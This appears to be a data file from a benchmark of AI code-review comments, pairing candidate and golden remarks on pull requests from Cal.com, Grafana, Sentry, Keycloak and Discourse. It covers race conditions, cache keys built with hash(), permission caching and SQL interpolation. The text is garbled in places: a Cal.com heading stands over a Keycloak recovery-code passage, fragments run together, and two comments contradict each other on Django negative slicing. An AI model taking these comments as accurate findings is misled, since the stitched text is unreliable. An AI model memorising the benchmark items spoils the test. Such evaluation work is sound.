false_positives.candidate:
Outer try/catch abandons the cancellation loop and orphans DB deletes on first SendGrid failure

The try block wraps both the `for (const reminder of remindersToCancel)` loop and the final `await Promise.all(workflowRemindersToDelete)`. If any `client.request({...status:"cancel"})` call rejects mid-loop, control jumps straight to the catch and the function returns. Two consequences: (a) every reminder after the failing one is never sent to SendGrid and will still be delivered, and (b) the `prisma.workflowReminder.delete` promises already pushed into `workflowRemindersToDelete` are never awaited — they become orphaned microtasks (also a memory leak) and any subsequent cron run will not see them cleaned up. The catch only logs and returns. Move the try/catch inside the loop (or use `Promise.allSettled`) so each cancellation is independent and all DB deletes are processed.

remindersToCancel query is missing the EMAIL method filter

`prisma.workflowReminder.findMany({ where: { cancelled: true, scheduledDate: { lte: dayjs().add(1, "hour").toISOString() } } })` does not filter by `method: WorkflowMethods.EMAIL`. SMS reminders don't currently reach `cancelled=true` (because `deleteScheduledSMSReminder` always deletes the row), but the only thing this query feeds is a SendGrid `/v3/user/scheduled_sends` POST with the `referenceId`, which is a SendGrid batch id. If anything ever marks an SMS reminder `cancelled=true`, the code would call SendGrid's email API with a Twilio SID. Add `method: WorkflowMethods.EMAIL`.

deleteScheduledEmailReminder with immediateDelete=true has no fallback when the SendGrid cancel fails

When `immediateDelete` is true and `client.request({ url: "/v3/user/scheduled_sends", method: "POST", body: { batch_id: referenceId, status: "cancel" } })` throws (e.g. SendGrid's 100-pending-cancellation limit described in the PR, or a transient HTTP error), the function catches the error, logs it, and returns without writing anything to the database. The `WorkflowReminder` row stays at `scheduled=true` with `cancelled=null`, so the new cron logic in `scheduleEmailReminders.ts` (which only matches `cancelled: true`) will never pick it up, and the email remains scheduled in SendGrid — i.e. the very bug the PR is supposed to fix. Fall back to setting `cancelled: true` when the immediate cancel fails so the cron will retry.

Reschedule in handleNewBooking passes immediateDelete=true, defeating the PR's fix for the SendGrid 100-cancellation limit

The PR's stated root cause for the original bug is that SendGrid caps pending cancellations at 100 and any new cancellation request beyond that silently fails, leaving the scheduled email in place. The new `cancelled`/cron approach in `scheduleEmailReminders.ts` exists precisely to avoid that cap. But here, on every successful reschedule, the code still calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)`, which goes straight to SendGrid's cancel API. Under any volume of reschedules this hits the same 100-pending-cancellations ceiling and rescheduled bookings will again leak their reminders. Use the same delayed-mark-cancelled approach as `handleCancelBooking.ts` (no `immediateDelete`) so the cron job, not the synchronous call, drives the actual SendGrid cancel.

Reschedule in handleNewBooking cancels immediately, but requestReschedule in bookings.tsx does not — same operation, different behavior

`handleNewBooking.ts` line 968 calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)` when an attendee reschedules, while `packages/trpc/server/routers/viewer/bookings.tsx` lines 488-494 in the `requestReschedule` mutation call `deleteScheduledEmailReminder(reminder.id, reminder.referenceId)` (no `immediateDelete`). Both code paths cancel the reminders of the same kind of booking (a cancelled-and-rebooked booking), so the resulting behavior — whether the email is gone immediately or up to a cron cycle later, and whether SendGrid is hit synchronously at all — should be identical. Pick one strategy and apply it in both places. The `handleNewBooking.ts` choice is also the one that reintroduces the 100-limit bug above.

Workflow step deletion uses immediateDelete=true while step editing does not — inconsistent with the PR's approach

In the `update` mutation, when a step is deleted (line 521) the code calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)` (immediate delete), but when a step is merely edited (line 576) it calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId)` (deferred to the cron). Deleting and editing a workflow step both end with the old reminders no longer matching the workflow definition, so they should use the same cancellation strategy. As written, deleting a workflow on a high-traffic account still synchronously calls SendGrid's cancel API and risks the 100-pending-cancellations cap the PR is meant to work around.

First deleteMany runs before cancelled-reminder processing, racing SendGrid's send window

The handler first runs `prisma.workflowReminder.deleteMany({ where: { method: EMAIL, scheduledDate: { lte: dayjs().toISOString() } } })`, then finds `cancelled: true` reminders whose `scheduledDate <= now + 1h` and only then calls SendGrid's cancel API. A `cancelled=true` row whose `scheduledDate` is in the past (e.g. the cron was delayed and SendGrid has not yet processed `sendAt`) is wiped by the first deleteMany before it can be cancelled, and the email will be delivered. Process the `cancelled=true` cancellation loop before the past-dated cleanup deleteMany (or scope the cleanup deleteMany to `cancelled: { not: true }`).

Error in cancel-reminder catch is logged with console.log instead of console.error

Line 76 uses `console.log(\`Error cancelling scheduled Emails: ${error}\`)` while every other failure path in this file (lines 22, 29, 222) uses `console.log` for non-errors too, but this branch is explicitly an error case from the new cancellation loop. Use `console.error` so log-shipping and alerting can distinguish operational failures from normal output.

false_positives.candidate:
No transaction / no error handling around calendar sync after DB update

`prisma.booking.update` writes the new attendees to the database first. `eventManager.updateCalendarAttendees(evt, booking)` is then awaited with no try/catch. If the calendar integration throws (rate limit, expired token, network, etc.), the function rejects with a 500, but the database already has the new attendees persisted. Result: the Cal.com booking now lists guests that are NOT on the linked Google/Outlook calendar, and the user has no way to roll back. The whole flow should be wrapped in a transaction or, at minimum, the calendar sync should happen first so a failure leaves the system consistent.

Any attendee can add arbitrary guests without organizer consent

Permission grants the addGuests capability not only to organizers and team admins/owners but also to any attendee (`isAttendee = !!booking.attendees.find(a => a.email === user.email)`). Combined with the lack of rate limiting, any invitee can enumerate or spam-add external email addresses to someone else's meeting. There is no confirmation from the organizer, and the organizer is only informed after the fact via `OrganizerAddGuestsEmail`. Either remove the attendee branch or require organizer approval.

No check on booking status before mutating

The handler never inspects `booking.status` or `booking.endTime`. It will happily persist new attendees onto CANCELLED, REJECTED, or already-finished bookings, and `eventManager.updateCalendarAttendees` will then either fail or silently modify a calendar event for a meeting that no longer exists. The handler should reject mutations on non-ACCEPTED or past bookings.

attendees[0].name accessed without null check in email subject

The subject template reads `this.calEvent.attendees[0].name`. If `attendees` is empty this throws a TypeError that aborts the email; if `attendees[0].name` is null/undefined the subject renders as "Guests Added: <eventType> with  at <date>". Add a guard or fall back to the organizer/team name.

isInvalidEmail flag is not cleared after a successful mutation

On validation failure `setIsInvalidEmail(true)` is called, but neither `onSuccess` nor `handleAdd` ever resets it back to false. A user who first submits invalid emails, then fixes them and successfully adds guests, will continue to see the red "Emails must be unique and valid" banner in the dialog (and after reopening the dialog for the same booking) until the Cancel button is clicked. Reset the flag at the start of `handleAdd` and inside `onSuccess`.

addGuests uses authedProcedure instead of bookingsProcedure

Sibling mutations that touch a booking (`editLocation`, `confirm`, etc.) use `bookingsProcedure`, which typically enforces booking-level permission middleware. `addGuests` is wired with the looser `authedProcedure`, so any authenticated user can hit the endpoint and the only authorization is the handler's own checks (which have the bugs noted above). Use `bookingsProcedure` for consistency and to inherit the centralized guards.

Email-send errors are swallowed with console.log

`catch (err) { console.log("Error sending AddGuestsEmails"); }` discards the error object entirely (notice `console.log` rather than `console.error`, and `err` is not used). Use `logger.error(...)` from `@calcom/lib/logger` like the rest of the file, and include `err` so the failure is diagnosable in production.

Direct reassignment of a prop

`value = value || [];` mutates the `value` prop in place. While React does not re-render on prop mutation, this is misleading code and means subsequent reads use the mutated object reference. Use a default parameter (`value = []` in the signature) or a local `const emails = value ?? []`.

Using array index as React key in the email list

`value.map((field, index) => <li key={index} ...)` reuses keys when emails are added/removed, which causes React to reuse input components and can lose focus/caret position or render stale values for the newly inserted empty input. Use a stable id (e.g. include the email value or a counter ref).

hosts.map users lack destinationCalendar, so teamDestinationCalendars stays empty

In the new loadUsers(), when the event has hosts, `users` is built via `hosts.map(({ user, isFixed }) => ({ ...user, isFixed }))`. The `user` record on each host is whatever Prisma returned for the relation; no explicit `select`/`include` is added, so relation fields like `destinationCalendar` are not present on those `user` objects. Downstream, `teamMemberPromises` does `if (isTeamEventType && eventType.schedulingType === "COLLECTIVE" && user.destinationCalendar)` and pushes to `teamDestinationCalendars` — this will always be undefined for host-loaded users, so `teamDestinationCalendars` ends up empty for COLLECTIVE team events. The whole point of this PR (multiple hosts receiving calendar events) silently fails whenever hosts come from the `eventType.hosts` relation.

evt.destinationCalendar?.push silently no-ops when null

Right above, `destinationCalendar` is set to `null` when neither `eventType.destinationCalendar` nor `organizerUser.destinationCalendar` is set. The follow-up `if (isTeamEventType && eventType.schedulingType === "COLLECTIVE") { evt.destinationCalendar?.push(...teamDestinationCalendars); }` uses optional chaining on a potentially null array — `null?.push` is just `undefined`, it does nothing and does not warn. For any COLLECTIVE event without an event-type or organizer destination calendar, no team members' destination calendars are attached to `evt`, even though they were collected into `teamDestinationCalendars`. Replace `?.push(...)` with an explicit `evt.destinationCalendar ??= []; evt.destinationCalendar.push(...)` (or build the final array once and assign it).

Only first destination calendar is persisted on the booking

The booking `data` block writes `destinationCalendar: evt.destinationCalendar && evt.destinationCalendar.length > 0 ? { connect: { id: evt.destinationCalendar[0].id } } : undefined`. The Booking schema has a single `destinationCalendar` relation, so only the first entry in `evt.destinationCalendar` is persisted. The PR’s stated goal is to invite every host to their own calendar, but on any later operation (reschedule, cancel, edit-location, request-reschedule) the booking record exposes only one destination. The other per-host calendar references survive only as BookingReference rows; deleting the booking.destinationCalendar connect for the event-type even on first creation breaks the previously persisted id reference for non-collective callers and silently drops the per-host mapping for re-runs. Either the schema needs to become a join table, or the booking should record which host’s calendar it was set under and consumers must be updated accordingly — this PR ships neither.

deleteEvent fallback also searches by externalId === externalCalendarId

Same defect as in `updateEvent`. `const calendarId = externalCalendarId ? externalCalendarId : event.destinationCalendar?.find((cal) => cal.externalId === externalCalendarId)?.externalId;` — when `externalCalendarId` is null/empty the `find` predicate compares each calendar’s externalId against that same null/empty value, so the find never matches and the fallback always yields `undefined`. The eventual ternary `calendarId ? calendarId : defaultCalendarId` then drops to `"primary"`, which is the wrong calendar for multi-host events and can delete from the wrong account or simply 404. Either use `event.destinationCalendar?.[0]?.externalId` for the fallback or restrict the lookup to a credentialId-keyed match.

loadUsers aggressively throws on empty dynamicUserList and is no longer required to return users

Recovery codes must be single-use; the local `RecoveryAuthnCodesCredentialProvider` mutates its credential data on each successful `isValid` call, so the contract that the federated provider now implements must do the same (e.g. by calling `updateCredential` to remove the consumed code). After a successful verification, the authenticator calls `authenticatedUser.credentialManager().removeStoredCredentialById(recoveryCodeCredentialModel.getId())` whenever `allCodesUsed()` returns true. `removeStoredCredentialById` only operates on local (Keycloak DB) credentials. The code needs to use the credential-manager path appropriate for federated credentials (e.g. `removeCredential` / delegating to the user-storage provider), or branch on whether the credential is federated vs. stored.

Either propagate the failure (throw, or return a boolean) or at minimum log an error; `createOTPCredential` directly above for comparison returns a boolean for the same reason.

`testRecoveryKeysSetupAndLogin` only exercises a successful login with the first requested code. It does not (a) verify the same code cannot be reused on a second login, (b) verify that `allCodesUsed()` flips after consuming every code, (c) verify that the credential is removed from user storage once exhausted, or (d) verify that `CONFIGURE_RECOVERY_AUTHN_CODES` becomes a required action afterwards. Given the federated-storage bugs reported above (no consumption tracking, `removeStoredCredentialById` is wrong API, id mismatch), these are exactly the cases that would catch them. Reading thread is never joined before the assertion

The test starts a background thread that repeatedly calls `managedRealm.admin().groups().groups(...)`, then immediately proceeds to delete the groups, set `deletedAll.set(true)`, and assert on `caughtExceptions` without ever joining the thread. Two race conditions make this unreliable: (1) the thread can be in the middle of a `groups()` call when `deletedAll` flips to true; it will complete that call, potentially catch an exception, and add it to `caughtExceptions` AFTER `assertThat(caughtExceptions, Matchers.empty())` has already evaluated the list, so real NPEs are silently missed; (2) even if the thread exits before it, there is no happens-before edge between the thread's writes to `caughtExceptions` and the main thread's read (no join, no synchronization, no `volatile` semantics on the list beyond CopyOnWriteArrayList's internal ones), so the assertion is not guaranteed to observe the thread's writes. The test should capture the `Thread` reference, set `deletedAll.set(true)`, then call `thread.join()` before asserting.

In `OptimizedCursorPaginator.get_result`, the `enable_advanced_features` branch sets `start_offset = cursor.offset` (e.g. `-100`) and slices `queryset[-100:stop]`. With Django/Postgres this translates to `OFFSET -100 LIMIT ...`, which returns rows from the END of the result set, not the rows preceding the cursor. The surrounding comments ('efficient bidirectional pagination', 'reverse pagination from arbitrary positions', 'underlying Django ORM properly handles negative slicing') describe semantics that this code does not provide - it only shifts the window to the tail of the dataset. An admin who sends `cursor=<value>:-large:0` expecting 'the page before' will silently receive the last page. Either the comments should be rewritten to describe 'return a window from the tail' or the feature should be removed/renamed so callers are not misled.

false_positives.candidate:
Watch goroutine never exits after backend channel close

In search.init(), the watch goroutine uses `for { v := <-events; s.handleEvent(watchctx, v) }`. When the storage backend stops (e.g., via sql backend's `defer close(stream)` after `b.done` triggers), the channel is closed and `<-events` returns the zero value (a nil *WrittenEvent) forever. handleEvent then hits the `!slices.Contains(...)` branch and logs `ignoring watch event type 0` on every iteration, leading to unbounded log spam and a leaked goroutine for the lifetime of the process. The loop should be `for v := range events` (which exits when the channel closes) or use a `select` on a done channel. Combined with `watchctx := context.Background()` (which never cancels), there is no way to stop this goroutine. The PR's introduction of eager Init makes this more likely to be exercised during normal shutdown.

Trace propagation fix is incomplete for the watch loop

The PR description states 'Fixes trace propagation by passing span contexts down', but the long-running watch goroutine spawned in search.init() still uses `watchctx := context.Background()` (note the `// new context?` comment, suggesting this was intentionally left undone). The init() and build() functions now correctly propagate the new ctx via `ctx, span := s.tracer.Start(ctx, ...)`, but the watch loop and everything downstream of it (all handleEvent invocations) lose the trace context. Either fix this to use the parent ctx for trace propagation, or document in the commit message why watch events are intentionally not traced.

NewResourceServer now blocks on initialization, behavior change

NewResourceServer now synchronously calls `s.Init(ctx)` before returning, which performs lifecycle init, builds the entire search index across all namespaces, and starts the watch loop. Previously this was deferred to the first gRPC call. Callers that constructed the server (e.g., tests, alternate wiring code) expecting non-blocking construction, or that supplied their own timeout for init, will now block indefinitely on a potentially expensive operation with no timeout context. The PR description asks 'Does anything else depend on initializing US lazily? What could this break?' but no callers were audited in the diff. At minimum, the timeout/context contract of NewResourceServer has changed and any test or production path that wanted to construct a server without paying the init cost will be affected.

Search watch goroutine is leaked on partial init failure

Init now runs: lifecycle.Init -> search.init -> initWatcher. search.init spawns the long-running watch goroutine (the one with the closed-channel bug above). If search.init succeeds but initWatcher then fails (returning the error from NewResourceServer), the watch goroutine is never torn down and the server is returned as nil to the caller, so nothing in the caller path can cancel it. There is no rollback or cleanup if a later init step fails after an earlier one has started goroutines. This needs either an explicit cleanup step or defer-with-undo pattern to release resources on partial init failure.

BuildIndex span context is not propagated, inconsistent with other trace fixes

The PR changes `_, span := ...Start(ctx, ...)` to `ctx, span := ...Start(ctx, ...)` in search.init, search.build, and sql.GetResourceStats to propagate the new ctx to downstream calls. bleve.BuildIndex still has `_, span := b.tracer.Start(ctx, tracingPrexfixBleve+"BuildIndex")` and never reassigns ctx, so the new ctx (with the span) is discarded. This is inconsistent with the stated goal of fixing trace propagation. Either change this to `ctx, span := ...` for consistency, or note that BuildIndex has no child spans (and the discrepancy is intentional). Note also that the surrounding `_, err := index.NewBatch()`-style code creates side effects (a batch is opened); if any future code adds tracing to those paths it would silently miss the parent context.

Stop writes s.initErr without synchronization

Stop assigns `s.initErr = fmt.Errorf("service is stopping")` outside of any mutex or sync.Once, while Init reads it under once.Do. After the PR, in practice the calls don't overlap (Init runs synchronously inside NewResourceServer and returns before Stop is reachable), but the field is still shared mutable state guarded only by `s.once` for reads in Init. A future change that calls Init externally (the once.Do machinery is still there, suggesting that was the intent) would race with Stop. Consider removing the s.initErr mutations in Stop entirely or guarding the field with a mutex.

Postgres skip is a workaround, not a fix

The diff adds `if dbType == "postgres" { t.Skip(...) }` with a TODO, but this PR directly changes the unified storage init path that the test exercises (the test boots the storage server target, which now eagerly calls Init inside NewResourceServer). The exact reason the test fails on postgres is unknown and unfixed, and the new init-at-startup behavior is not validated against postgres. The PR's main goal (fixing context-cancelled errors from lazy init) should be covered by a test that exercises the storage server target under at least one DB, not just mysql.

false_positives.candidate:
Assert failure leaves partition stuck forever

In `SimpleQueueProcessingStrategy.submit`, the assert `assert isinstance(message.value, BrokerValue)` is performed before accessing `message.value`. If it fails (or any other error occurs before we can safely read `message.value`), the `except Exception` handler re-checks `isinstance(message.value, BrokerValue)` — which is the same condition that just failed — and silently does nothing. The offset for that message is never added to the tracker, so it stays outstanding and blocks every future commit for that partition in `OffsetTracker.get_committable_offsets` (which iterates only up to the highest completed offset). The consumer will hang on this partition indefinitely, with only a log line as evidence. The error should either be re-raised so arroyo/DLQ can handle it, or the offset must be marked complete unconditionally (even if `BrokerValue` can't be read) by carrying the partition/offset before the assert.

Graceful shutdown drops in-flight queue items

`FixedQueuePool.shutdown` sets `worker.shutdown = True` for every worker and then calls `q.shutdown(immediate=False)`. Because `OrderedQueueWorker.run` checks `while not self.shutdown` *before* calling `self.work_queue.get()`, workers exit the loop as soon as the flag is observed and never drain items that were already in their queue. Those items have offsets recorded as outstanding in `OffsetTracker`, but since `complete_offset` is never called, they will never be committed and the messages will be re-delivered after restart. The `wait_until_empty` helper exists on the same class but is never invoked, indicating the intent was to drain but the implementation doesn't. Either remove the `wait_until_empty` helper or call it (with a bounded timeout) before flipping the shutdown flag.

Hash-based group assignment is not stable across restarts

`FixedQueuePool.get_queue_for_group` uses Python's built-in `hash()`, which is randomized per process under the default `PYTHONHASHSEED`. The class docstring promises 'consistent hashing' and 'Each group is consistently assigned to the same queue'. Within a single process lifetime the assignment is stable (since workers/queues live in memory), but after any restart the same `group_key` can map to a different queue index — directly contradicting the docstring. This is misleading to future maintainers and would break correctness if the pool is ever extended to persist queue assignments or run across processes. Use a stable hash (e.g. `hashlib.sha1(group_key.encode()).hexdigest()`, `zlib.crc32`, or `hashlib.md5`) and update the docstring to reflect the actual guarantee.

Docstring claims natural backpressure but queue is unbounded

`SimpleQueueProcessingStrategy` docstring states 'Natural backpressure when queues fill up'. However, the queues are constructed via `queue.Queue()` (see `FixedQueuePool.__init__`), which is unbounded. Producers (the arroyo consumer thread calling `submit`) will never block, so a slow worker group causes unbounded memory growth. Either pass `maxsize` to `queue.Queue(maxsize=...)` to actually provide backpressure, or correct the docstring.

Worker shutdown flag is a non-atomic bool

`OrderedQueueWorker.shutdown` is a plain `bool` attribute written by the main thread (in `FixedQueuePool.shutdown`) and read by the worker thread. While CPython's GIL makes this safe in practice, it is not portable and is not thread-safe by Python's memory model. Use `threading.Event` (`self._stop_event`) and `self._stop_event.is_set()` instead, matching the pattern already used by `SimpleQueueProcessingStrategy.shutdown_event`.

num_queues is not validated

`FixedQueuePool.__init__` accepts `num_queues: int = 20` without checking it is positive. If a caller (or the new `thread-queue-parallel` mode) passes `max_workers=0` or a negative value, the loop creates no queues/workers, and the first call to `submit` raises `IndexError` from `self.queues[queue_index]` deep in `FixedQueuePool.submit`. Validate `num_queues >= 1` (and ideally a sensible upper bound) at construction time so misconfiguration fails loudly and early.

Offset tracker scans full range per partition every second

`OffsetTracker.get_committable_offsets` is called once per second from `_commit_loop` and, for each partition, computes `min(all_offsets)` and `max(all_offsets)` and then iterates the full range `range(start, max_offset + 1)`. With a partition that has, say, 10k outstanding offsets, every commit tick performs O(10k) set lookups plus two O(n) set scans. For a backlog scenario this is O(n) per second per partition. Track `min_offset` and `max_offset` incrementally (e.g. on `add_offset`) and stop as soon as the first gap is hit instead of recomputing the extremes every call.

Worker thread can die silently on unexpected get() error

`OrderedQueueWorker.run` only catches `queue.ShutDown` around `self.work_queue.get()`. Any other exception raised by `get()` (e.g. an OS-level error, a future Python version change) propagates out of `run()` and kills the daemon thread silently — items remaining in that queue will never be processed and their offsets will never be marked complete, permanently blocking that partition's commits. Wrap the call in a broader `except Exception` that logs and either retries or exits cleanly, and consider asserting the worker is still alive from a supervisor.

Integration test relies on arroyo private internals

`test_thread_queue_parallel_kafka_offset_commit` drives the consumer by calling `processor._run_once()` in a loop and `processor._shutdown()` at the end. The leading underscore marks these as private arroyo APIs; their names/signatures are not part of arroyo's public contract and can change without warning, breaking this test (and the CI signal it provides) on an arroyo upgrade. Use the public `StreamProcessor.run()` method (which blocks until the consumer stops) instead, with a bounded stop condition or shutdown timeout, so the test exercises the same path real deployments use.

Kafka integration test only waits 5 seconds for 5 messages

In `test_thread_queue_parallel_kafka_offset_commit`, the test produces 5 messages and then runs `processor._run_once()` in a loop for only 5 seconds. The assertions then require that `commit_count >= 1` and that the committed offset reached 5, but the producer flush + consumer rebalance + first poll can easily eat most of that budget on a loaded CI box, producing a flaky test. Wait for `stats["total_items"] == 0` (as the other tests in this file do) before tearing the processor down, and assert on the committed offset only after that condition is met.

`num_queues=max_workers or 20` falls back to 20 whenever `max_workers` is `None`, `0`, or any other falsy value. An operator who passes `--max-workers 0` to disable the new mode will instead get 20 queues/workers started, with no log or error. The fallback should be explicit (`max_workers if max_workers else 20` is functionally the same but at minimum document the behavior, or raise on non-positive values so operators notice the misconfiguration).

`OptimizedCursorPaginator` allows negative offsets that Django ORM does not support

When `enable_advanced_features=True` and `cursor.offset < 0`, the paginator computes `start_offset = cursor.offset` and slices the queryset as `queryset[start_offset:stop]`. Django's QuerySet slicing with negative indices is not supported and raises `AssertionError: Negative indexing is not supported` (or, in some versions, produces invalid SQL `LIMIT -N`). The accompanying comment claims "The underlying Django ORM properly handles negative slicing automatically" - this is false. The new audit-log endpoint exposes this code path to any superuser or member with `has_global_access` (see `organization_auditlogs.py`), so any crafted `?cursor=...:-1:0` request against that endpoint will return a 500.

The candidate also explains why this fails, since Django does not support negative slicing.

With depth capped at 1000, any trace whose `span-buf:sr:` redirect chain is longer than 1000 will exit the loop before convergence, write the new span to a stale `set_span_id`, and then fail to merge subsequent spans into the real segment set. The downstream consequence is silently dropped spans (incomplete segments flushed out) - a data integrity regression. true_positives.golden_comment: Using Python’s built-in hash() to build cache keys is non-deterministic across processes (hash randomization), so keys won’t match across workers and invalidate_upsampling_cache may fail to delete them. true_positives.matched_candidate:
Cache key uses hash() which is randomized per Python process

The cache key uses `hash(tuple(sorted(snuba_params.project_ids)))`. Python's built-in `hash()` for tuples is randomized per interpreter process (PYTHONHASHSEED). In any multi-process deployment (uWSGI/gunicorn workers), each worker will compute a different hash for the same project set, so cache entries written by one worker will never be read by another. Consequences: (1) the cache provides no benefit across workers — every request is a miss; (2) `invalidate_upsampling_cache` (line 67) computes the same randomized hash in its caller, so it cannot invalidate entries created by other workers, making the invalidation function dead in practice. Use a deterministic hash (e.g., `hashlib.sha256` over the joined IDs) or simply stringify the sorted IDs.
true_positives.reasoning: Both comments flag the same problem. The cache key is built with Python's hash(), which is randomized per process, so keys do not match across workers and invalidate_upsampling_cache cannot delete entries created by other workers. Both recommend deterministic serialization of the project IDs.

The new test file exercises the private helpers (`_are_all_projects_error_upsampled`, `_is_error_focused_query`, `_should_apply_sample_weight_transform`, `transform_query_columns_for_error_upsampling`) but never calls `is_errors_query_for_error_upsampled_projects`, which is the only function actually used by `OrganizationEventsStatsEndpoint._get_event_stats`. `_should_apply_sample_weight_transform(dataset: Any, request: Request)` compares `dataset` against `discover`, `errors`, and `transactions` modules. The parameter is typed `Any`, but the caller (`organization_events_stats.py` line 220) passes a module from `sentry.snuba`, and the new module is in the stricter-typing `[[tool.mypy.overrides]]` block in `pyproject.toml`. false_positives.candidate:
PermDenialCache can block legitimate access after permission grant or resource recreation

The permDenialCache is consulted at the very start of Check() (lines 116-121) and short-circuits to Allowed:false without ever touching the DB or the permCache. The denial is written at lines 153-155 whenever checkPermission returns false, with a 30-second TTL (shortCacheTTL). Because the denial entry is never invalidated when permissions change or resources are created, the following scenarios keep a freshly-authorised user locked out for up to 30 seconds: (1) user A previously failed a check on resource X (e.g. before X existed or before the grant), the entry is cached, then X is created with A as owner / A is added to a team that grants access — the next Check still hits the denial key and denies; (2) the same happens when a resource is deleted and later recreated with the same UID under new ownership; (3) a race where A asks for X before the create-grant transaction commits — A is denied, the denial is cached, and once the transaction commits A still cannot access X until the entry expires. This re-introduces precisely the 'creator cannot access the dashboard/folder they just created' symptom this PR is supposed to fix. Consider only caching denials for resources known to exist, invalidating the entry on permission change, or dropping the TTL drastically.

If the user already has a populated permCache for the action, List trusts it as-is and never requeries. Compare with Check() (lines 123-136) which now requeries when the cached scopeMap does not contain the requested name/folder. The PR's stated goal — 'dash/folder creator can't access the dashboard/folder that they've just created' — is therefore only fixed for Check; a user who navigates to the dashboards list immediately after creating a dashboard will not see the new entry until the permCache expires (30s). Either List should also requery when the requested name/folder is absent from the cached scopes, or at minimum the dashboard/folder create path should invalidate or refresh the relevant permCache entries.

This allows stale cached grants to provide access to revoked resources, posing a security risk.

The cache key construction in `userPermDenialCacheKey` uses simple string concatenation with underscores, which can lead to ambiguous keys and collision risks when any component contains underscores or is empty. This could result in incorrect denial cache hits, affecting user permissions.

Operators reading the log will see a message saying annotations were cleaned alongside an error value, which is contradictory and makes incidents harder to diagnose. The log line should either branch on `err != nil` (different message/level on failure) or use Info/Debug on success and reserve Error for the failure path.

Immediately before the `deleteByIDs` call, the code logs `"err", err` where `err` is the result of `fetchIDs`. The `err` field in the structured log is therefore dead/misleading data and should be removed (or replaced with the result of the delete that follows). The constant `sqliteParameterLimit = 999` is the SQLite compile-time default prior to 3.32, but SQLite >= 3.32 (released 2020) raises the default to 32766, and Grafana's test name explicitly acknowledges this (`should not fail if batch size is larger than SQLITE_MAX_VARIABLE_NUMBER for SQLite >= 3.32.0`). The check should use the higher value (or be looked up via the dialect), and the comparison should ideally be against the actual `len(ids)` rather than the configured batch size — a configured batch of 1000 that returns 5 IDs should still use `?` placeholders.

In the SQLite fast path, the delete statement is built via `fmt.Sprintf("DELETE FROM %s WHERE id IN (%s)", table, values)` where `values` is constructed by repeatedly formatting `int64` IDs with `%d`. While `%d` on an int64 is safe today, this is a regression from the prior fully-parameterized approach and is fragile: any future change that lets IDs come from a less-trusted source, or that changes the column type, breaks the SQL safety guarantee. The same pattern also bypasses query caching and makes the statement harder to read in slow-query logs. A safer workaround is to chunk the slice into batches of 999 (or 32766) and use placeholders for each chunk.

`fetchIDs` builds `SELECT id FROM %s` and `DELETE FROM %s WHERE id IN (...)` with the `table` argument interpolated directly into the SQL string. A future caller passing user-controlled input (e.g., a table prefix) would create an injection. The function should validate `table` against a fixed allow-list or use the dialect's identifier quoting.

`untilDoneOrCancelled` exits when `affected == 0`. With the new two-statement design, an entire batch's IDs can be concurrently deleted (or in the MaxCount case, removed by a concurrent delete on a row that shifts the OFFSET) between `fetchIDs` and `deleteByIDs`, producing `affected == 0` while there are still annotations to clean. The cleanup will then stop for the current cycle even though rows remain, relying entirely on the (now 1-minute) ticker to retry. A retry that re-issues the same `fetchIDs` (with fresh IDs) instead of terminating would close this gap.

WebKit/Blink never shipped this property — they used `-webkit-box-ordinal-group` for the 2009 spec (already included on line 126) and then went straight to the unprefixed `order`. `-webkit-order` is not a valid CSS property and is silently ignored. This is a typo adjacent to the correct `-webkit-box-ordinal-group` line.

Removed bullet badge vertical alignment without replacement

The diff deletes the rule `.extra-info-wrapper .badge-wrapper { float: left; &.bullet { margin-top: 5px; } }` and replaces it with `float: left` only, while also adding `@include order(2)` to the wrapper. The previous `margin-top: 5px` on bullet-style badges was used to vertically align the colored bullet with adjacent baseline-aligned text (a typical alignment fix for inline elements used inside a larger line of text). Nothing in this PR provides an equivalent offset, so bullet-style category badges rendered inside `.extra-info-wrapper` (e.g., on topic lists and the topic page header) may now sit visually lower than the surrounding text. This is a regression with no test or visual reference provided.

`.small-action-desc` padding was changed from `0.5em 0 0.5em 4em` (with a matching `margin-top: 5px`) to `padding: 0 1.5%` while `.small-action` is converted to a flex container. The original 4em left padding was sized to clear the `.topic-avatar` icon column in the float-based layout. In the new flex layout the avatar becomes a sibling flex item, but the new `padding: 0 1.5%` collapses the inner `.avatar`'s surrounding space to a tiny percentage with no minimum, and the old `margin-top: 5px` was dropped without a replacement. Combined with the removal of `padding-top: 4px` on `> p`, the description block is likely to render noticeably tighter and/or vertically misaligned versus the avatar column. No screenshot, test, or visual regression coverage accompanies this change.

Complete removal of .title rule while relying on flex container

The diff deletes the entire `.title { float: left; }` rule and turns `.contents` into a flex container. While removing the float is intentional, the rule is now gone entirely — any other declaration (e.g., `min-width`, `max-width`, `flex` shrink behavior, `white-space`) that downstream consumers might have relied on for the title element is no longer being applied here. In addition, the fallbacks produced by the new `flexbox()` mixin (`-webkit-box`, `-moz-box`) make `.contents` a 2009-spec box container in legacy browsers, where `.title` and `.panel` will not behave like modern flex items; without the removed float, the layout in those legacy engines has no clear-float behavior. The change should at minimum be verified visually in a legacy-WebKit/Firefox fallback.

-webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.

Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.

The new `def include_website_name` method at line 153 is missing the `?` suffix: it should be `def include_website_name?`. ActiveModel Serializers discovers conditional include logic by looking for predicate methods named `include_<attr>?` on the serializer. Without the `?`, this method is not recognized as an include check, and `website_name` will be included in the serialized JSON whenever the attribute method exists, regardless of whether `website` is set. This contradicts the design intent shown by the body `website.present?` and is inconsistent with every other `include_*?` method in the same file (e.g., `include_email?` at line 117, `include_stats?`, `include_suspend_reason?`, `include_user_fields?`, `include_topic_post_count?`), all of which correctly use the predicate form. The three tests added in this PR only cover branches (1) and (3); the elsif branch (the `www.example.com == forum.example.com` case) is not exercised at all. That branch contains the most complex logic in the method — `website_host.split('.')[1..-1].join('.') == discourse_host.split('.')[1..-1].join('.') ? website_host + URI(website.to_s).path : website_host` — and has both a true and false outcome that should be verified, e.g., `Discourse.current_hostname = 'forum.example.com'` with website `http://www.example.com/user` (should yield `www.example.com/user`) and with website `http://www.other.com/user` (should yield `www.other.com`, no path).

